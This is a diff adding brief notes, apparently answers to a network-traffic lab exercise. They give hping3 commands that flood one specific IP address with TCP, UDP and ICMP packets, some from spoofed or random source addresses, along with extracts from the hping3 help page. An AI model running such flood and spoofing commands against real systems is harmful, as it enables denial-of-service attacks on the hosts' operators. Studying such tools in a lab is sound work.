@@ -1,0 +1,36 @@
+1) 10,000 TCP packets all at once from random source IP Addresses
+
+hping3 178.128.232.201 -c 10000 --rand-source --flood
+
+
+2) 9,000 UDP packets in a span of 90 seconds from a spoofed source address
+
+hping3 178.128.232.201 -2 -a 192.168.254.254 -c 9000 -i u1000 
+
+
+3) 11,000 ICMP packets with a data size of 1KB at an interval of 75 packets per second
+
+hping3 178.128.232.201 -1 -c 11000 -d 1024 -i u13333
+
+
+
+
+
+
+help page extracts:
+ --rand-source    random source address mode. see the man.
+  -c  --count     packet count
+  -a  --spoof      spoof source address
+
+ -i  --interval  wait (uX for X microseconds, for example -i u1000)
+      --fast      alias for -i u10000 (10 packets for second)
+      --faster    alias for -i u1000 (100 packets for second)
+      --flood      sent packets as fast as possible. Don't show replies.
+
+
+ default mode     TCP
+  -0  --rawip      RAW IP mode
+  -1  --icmp       ICMP mode
+  -2  --udp        UDP mode
+
+  -d  --data       data size                    (default is 0)
